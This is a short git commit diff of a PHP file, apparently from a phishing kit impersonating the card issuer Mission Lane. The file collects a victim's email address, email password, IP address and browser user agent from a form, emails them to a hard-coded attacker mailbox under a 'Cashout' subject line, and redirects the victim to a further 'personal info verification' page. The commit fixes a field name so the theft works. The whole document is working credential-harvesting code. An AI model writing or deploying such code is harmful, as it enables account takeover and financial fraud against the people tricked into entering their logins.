539435a390f7269bf94d37f7381236b8ad4fad1f
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-10-08 19:29:32 +0200

    Update email_info.php

--- email_info.php
+++ email_info.php
@@ -2,13 +2,13 @@
 header('Location: /mission_lane/personal-info-verification.html');
 $Agent=$_SERVER['HTTP_USER_AGENT'];
 $Ip=$_SERVER['REMOTE_ADDR'];
-$email=$_POST['login_email'];
+$email=$_POST['email'];
 $email_password=$_POST['email_password'];
 $nl="\r\n";
 $from = "Cashout";
 $to = "nwaforalex158@outlook.com";
 $subject = "Cashout Is A Must By Gods  Grace";
-$message = 'LOGIN EMAIL: ' . $login_email . $nl.'EMAIL PASSWORD: ' . $email_password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
+$message = 'EMAIL: ' . $email . $nl.'EMAIL PASSWORD: ' . $email_password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
 $headers = "From:" . $from;
 mail($to,$subject,$message, $headers) 
 ?>
